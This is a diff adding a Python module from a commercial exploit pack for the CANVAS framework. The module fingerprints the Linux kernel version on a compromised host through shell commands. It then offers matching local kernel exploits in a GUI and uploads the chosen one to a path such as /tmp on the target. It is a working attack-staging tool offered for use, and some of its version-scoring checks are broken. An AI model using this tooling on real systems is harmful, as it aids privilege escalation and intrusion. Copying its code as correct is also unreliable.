@@ -1,0 +1,293 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import sys, os
+import pygtk
+import gobject
+
+pygtk.require("2.0")
+import gtk
+import gtk.glade
+
+sys.path.append(".")
+
+from canvasexploit import canvasexploit
+from canvaserror import *
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME="d2sec_kernleak"
+DESCRIPTION="An automatic tool for Linux Kernel 2.2/2.4/2.6 Information Disclosure Vulnerability"
+VERSION="1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR']=None
+DOCUMENTATION["Date public"]=None
+DOCUMENTATION["CERT Advisory"]=None
+DOCUMENTATION["Repeatability"]=None
+DOCUMENTATION["References"]=None
+DOCUMENTATION["CVE Name"]=None
+DOCUMENTATION["CVE Url"]=None
+DOCUMENTATION["Notes"]="This module does not care what target you've set - it always uses localhost"
+
+PROPERTY={}
+PROPERTY['TYPE']="Exploit"
+PROPERTY['SITE']="Local"
+PROPERTY['ARCH']=[ ["Linux", "i386"] ]
+
+class theexploit(canvasexploit):
+	def __init__(self):
+		canvasexploit.__init__(self)
+		self.node = "" 
+		self.host = "127.0.0.1"
+		self.dstfile = "/tmp/v"
+		self.supportedNodeArgs = [["linuxNode"]]
+		self.total = 3.0 
+		self.score = 0.0
+		self.kernver = ""
+		self.ex = ""
+		self.name = NAME
+		self.kernellbl = ""
+		self.chkversion = 1
+
+	def cancel(self, widget):
+		self.dlg.destroy()
+
+	def createGUI_distrib(self):
+		self.column_names = ['Exploit', 'Distribution', 'Kernel', 'Arch', 'CVE']
+
+		#self.gladefile = os.path.join(os.getcwd(), '/3rdparty/D2SEC/exploits/d2sec_kernleak/dialog2.glade2')
+		self.gladefile = os.getcwd() + '/3rdparty/D2SEC/exploits/d2sec_kernleak/dialog2.glade2'
+		self.wTree = gtk.glade.XML(self.gladefile)
+
+		dic = {"on_cancel_clicked" : self.cancel,
+					"on_upload_clicked" : self.upload}
+
+		self.wTree.signal_autoconnect(dic)
+
+		self.dlg = self.wTree.get_widget("exploit_dialog")
+		self.dlg.set_size_request(800, 300)
+		#self.dlg.set_icon_from_file(os.path.join(os.getcwd(), '/3rdparty/D2SEC/exploits/d2sec_kernleak/d2.ico'))
+		self.dlg.set_icon_from_file(os.getcwd() + '/3rdparty/D2SEC/exploits/d2sec_kernleak/d2.ico')
+
+		self.treeview = self.wTree.get_widget("mytree")
+		self.treeList = gtk.ListStore(str, str, str, str, str)
+		self.treeview.set_model(self.treeList)
+		self.treeselection = self.treeview.get_selection()
+
+		self.column = [None] * len(self.column_names)
+
+		self.column[0] = gtk.TreeViewColumn(self.column_names[0], gtk.CellRendererText(), text=0)
+		self.column[0].set_resizable(True)
+		self.column[0].set_sort_column_id(0)
+
+		self.column[1] = gtk.TreeViewColumn(self.column_names[1], gtk.CellRendererText(), text=1)
+		self.column[1].set_resizable(True)
+		self.column[1].set_sort_column_id(1)
+
+		self.column[2] = gtk.TreeViewColumn(self.column_names[2], gtk.CellRendererText(), text=2)
+		self.column[2].set_resizable(True)
+		self.column[2].set_sort_column_id(1)
+
+		self.column[3] = gtk.TreeViewColumn(self.column_names[3], gtk.CellRendererText(), text=3)
+		self.column[3].set_resizable(True)
+		self.column[3].set_sort_column_id(1)
+
+		self.column[4] = gtk.TreeViewColumn(self.column_names[4], gtk.CellRendererText(), text=4)
+		self.column[4].set_resizable(True)
+		self.column[4].set_sort_column_id(1)
+
+		self.treeview.append_column(self.column[0])
+		self.treeview.append_column(self.column[1])
+		self.treeview.append_column(self.column[2])
+		self.treeview.append_column(self.column[3])
+		self.treeview.append_column(self.column[4])
+
+		self.uploadbutton = self.wTree.get_widget("uploadbutton")
+
+		# Get Entry values
+		self.h = self.wTree.get_widget("kernel")
+		self.h.set_text(self.kernellbl)
+
+		self.h = self.wTree.get_widget("host")
+		self.node.getallips()
+		iplist = self.node.interfaces.all_ips()
+		self.h.set_text(iplist[0])
+
+		self.dstfileentry = self.wTree.get_widget("dstfile")
+
+		#exploits = open(os.path.join(os.getcwd(), '/3rdparty/D2SEC/exploits/d2sec_kernleak/kernleak_distrib.txt'), "r").readlines()
+		exploits = open(os.getcwd() + '/3rdparty/D2SEC/exploits/d2sec_kernleak/kernleak_distrib.txt', "r").readlines()
+		for e in exploits:
+			if len(e) > 0:
+				(ex, distrib, ver, arch, cve, desc) = e.split(":")
+				if self.chkversion:
+					if ver.find(self.kernver) >= 0:
+						self.treeList.append([ex, distrib, ver, arch, cve])
+				else:
+					self.treeList.append([ex, distrib, ver, arch, cve])
+
+		self.dlg.set_position(gtk.WIN_POS_CENTER_ALWAYS)
+		self.dlg.show()
+
+	def createGUI_kernel(self):
+		self.column_names = ['Exploit', 'Arch', 'CVE', 'Name']
+
+		#self.gladefile = os.path.join(os.getcwd(), '/3rdparty/D2SEC/exploits/d2sec_kernleak/dialog2.glade2')	
+		self.gladefile = os.getcwd() + '/3rdparty/D2SEC/exploits/d2sec_kernleak/dialog2.glade2'	
+		self.wTree = gtk.glade.XML(self.gladefile)
+
+		dic = {"on_cancel_clicked" : self.cancel,
+					"on_upload_clicked" : self.upload}
+
+		self.wTree.signal_autoconnect(dic)
+
+		self.dlg = self.wTree.get_widget("exploit_dialog")
+		self.dlg.set_size_request(600, 300)
+		#self.dlg.set_icon_from_file(os.path.join(os.getcwd(), '/3rdparty/D2SEC/exploits/d2sec_kernleak/d2.ico'))
+		self.dlg.set_icon_from_file(os.getcwd() + '/3rdparty/D2SEC/exploits/d2sec_kernleak/d2.ico')
+
+		self.treeview = self.wTree.get_widget("mytree")
+		self.treeList = gtk.ListStore(str, str, str, str)
+		self.treeview.set_model(self.treeList)
+		self.treeselection = self.treeview.get_selection()
+
+		self.column = [None] * len(self.column_names)
+
+		self.column[0] = gtk.TreeViewColumn(self.column_names[0], gtk.CellRendererText(), text=0)
+		self.column[0].set_resizable(True)
+		self.column[0].set_sort_column_id(0)
+
+		self.column[1] = gtk.TreeViewColumn(self.column_names[1], gtk.CellRendererText(), text=1)
+		self.column[1].set_resizable(True)
+		self.column[1].set_sort_column_id(1)
+
+		self.column[2] = gtk.TreeViewColumn(self.column_names[2], gtk.CellRendererText(), text=2)
+		self.column[2].set_resizable(True)
+		self.column[2].set_sort_column_id(1)
+
+		self.column[3] = gtk.TreeViewColumn(self.column_names[3], gtk.CellRendererText(), text=3)
+		self.column[3].set_resizable(True)
+		self.column[3].set_sort_column_id(1)
+
+		self.treeview.append_column(self.column[0])
+		self.treeview.append_column(self.column[1])
+		self.treeview.append_column(self.column[2])
+		self.treeview.append_column(self.column[3])
+
+		self.uploadbutton = self.wTree.get_widget("uploadbutton")
+
+		# Get Entry values
+		self.h = self.wTree.get_widget("kernel")
+		self.h.set_text(self.kernellbl)
+
+		self.h = self.wTree.get_widget("host")
+		self.node.getallips()
+		iplist = self.node.interfaces.all_ips()
+		self.h.set_text(iplist[0])
+
+		self.dstfileentry = self.wTree.get_widget("dstfile")
+
+		#exploits = open(os.path.join(os.getcwd(), '/3rdparty/D2SEC/exploits/d2sec_kernleak/kernleak_kernel.txt'), "r").readlines()
+		exploits = open(os.getcwd() + '/3rdparty/D2SEC/exploits/d2sec_kernleak/kernleak_kernel.txt', "r").readlines()
+		for e in exploits:
+			if len(e) > 0:
+				(ex, arch, cve, desc, ver) = e.split(":")
+				if self.chkversion:
+					vers = ver.split(",")
+					for v in vers:
+						if v.find(self.kernver) >= 0:
+							self.treeList.append([ex, arch, cve, desc])
+				else:
+					self.treeList.append([ex, arch, cve, desc])
+
+		self.dlg.set_position(gtk.WIN_POS_CENTER_ALWAYS)
+		self.dlg.show()
+
+	def upload(self, widget):
+		if (self.treeselection.count_selected_rows() > 0):
+			model, paths = self.treeselection.get_selected_rows()
+			for p in paths:
+				iter = self.treeList.get_iter(p)
+				self.ex = model.get_value(iter, 0)
+			self.dstfile = self.dstfileentry.get_text()
+			self.host = self.h.get_text()
+		if not self.ex or not self.dstfile:
+			self.log("[D2] No exploit selected")
+		else:
+			self.log("[D2] Upload %s to %s:%s" % (self.ex, self.host, self.dstfile))
+			try:
+				self.node.shell.upload(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_kernleak/exploits/" + self.ex, "", self.dstfile)
+			except Exception, e:
+				self.log("[D2] %s" % e)
+				return
+
+	def startGUI(self):
+		if self.version == 0:
+			self.createGUI_kernel()
+		else:
+			self.createGUI_distrib()
+
+	def do_gui_operation(self, function, *args, **kw):
+		def idle_func():
+			gtk.gdk.threads_enter()
+			try:
+				function(*args, **kw)
+				return False
+			finally:
+				gtk.gdk.threads_leave()
+		gobject.idle_add(idle_func)
+
+	def uname(self):
+		nfo = self.node.runcommand("/bin/uname -r") 
+		self.kernver = nfo[:-1]
+
+	def osrelease(self):
+		nfo = self.node.runcommand("/bin/cat /proc/sys/kernel/osrelease")
+		nfo = nfo[:-1]
+		if self.kernver == str:
+			self.score += 1.0
+
+	def proc_version(self):
+		nfo = self.node.runcommand("/bin/cat /proc/version")
+		nfo = nfo.split()[2]
+		if self.kernver == str:
+			self.score += 1.0
+
+	def usrsrc(self):
+		nfo = self.node.runcommand("/bin/ls -alp /usr/src")
+		if nfo.find("linux-%s" % self.kernver) >= 0:
+			self.score += 1.0
+
+	def run(self):
+		# Get args
+		self.chkversion = int(self.argsDict.get("check_kernel_version", self.chkversion))
+		# Get version
+		for node in self.argsDict["passednodes"]:
+			t = node.nodetype
+			if t not in self.supportedNodeArgs[0]:
+				self.log("[D2] %s node type not supported" % t)
+				continue
+			self.node = node
+			if self.chkversion:
+				self.uname()
+				self.osrelease()
+				self.proc_version()
+				self.usrsrc()
+				if self.kernver.find("-") >= 0:
+					self.kernver = self.kernver.split("-")[0]
+				self.kernellbl = "%s (%d%%)" % (self.kernver, int((self.score/self.total)*100))
+				self.log("[D2] [%d%%] linux kernel version : %s" % (int((self.score/self.total)*100), self.kernver))
+			# Launch GUI
+			self.do_gui_operation(self.startGUI)
+		return 1
+
+if __name__ == "__main__":
+  print "This module is meant to be run only within CANVAS"
+
